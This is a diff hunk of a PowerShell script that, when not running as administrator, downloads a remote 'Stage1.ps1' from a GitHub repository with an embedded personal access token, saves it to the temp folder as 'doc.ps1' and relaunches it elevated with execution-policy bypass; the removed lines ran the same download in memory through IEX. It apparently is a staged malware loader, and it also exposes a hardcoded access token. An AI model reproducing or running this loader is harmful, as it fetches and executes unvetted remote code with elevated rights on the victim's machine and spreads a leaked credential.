@@ -3,12 +3,13 @@ $ErrorActionPreference = 'Stop'
 $isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
 
 if (-not $isAdmin) {
-    $scriptPath = $MyInvocation.MyCommand.Path
-    if ($scriptPath) {
-        Start-Process powershell.exe -ArgumentList "-NoP -EP Bypass -File `"$scriptPath`"" -Verb RunAs
-    } else {
-        Start-Process powershell.exe -ArgumentList "-NoP -EP Bypass -Command `"IEX (Invoke-WebRequest -UseBasicParsing -Uri 'https://api.github.com/repos/slynet999-coder/Yambo/contents/Stage1.ps1' -Headers @{'Authorization'='token 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';'Accept'='application/vnd.github.v3.raw'}).Content`"" -Verb RunAs
-    }
+    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+    $GhToken = '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'
+    $hdrs = @{"Authorization"="token $GhToken"; "Accept"="application/vnd.github.v3.raw"}
+    $resp = Invoke-WebRequest -UseBasicParsing -Headers $hdrs -Uri "https://api.github.com/repos/slynet999-coder/Yambo/contents/Stage1.ps1"
+    $scriptPath = Join-Path $env:TEMP "doc.ps1"
+    [IO.File]::WriteAllText($scriptPath, [Text.Encoding]::UTF8.GetString($resp.Content))
+    Start-Process powershell.exe -ArgumentList "-NoP -EP Bypass -File `"$scriptPath`"" -Verb RunAs
     exit
 }
 
